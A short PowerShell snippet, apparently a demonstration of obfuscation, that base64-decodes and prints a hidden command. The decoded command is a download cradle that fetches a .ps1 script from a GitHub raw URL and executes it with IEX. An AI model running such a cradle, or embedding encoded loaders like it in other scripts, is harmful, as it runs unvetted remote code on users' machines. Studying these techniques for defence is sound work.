$data = "cG93ZXJzaGVsbCBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DMFNCL3Jlc3NvdXJjZXNfY3liZXIvbWFpbi9zY3JpcHRzL2ZpbGUucHMxJyk="
$command = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
Write-Output $command
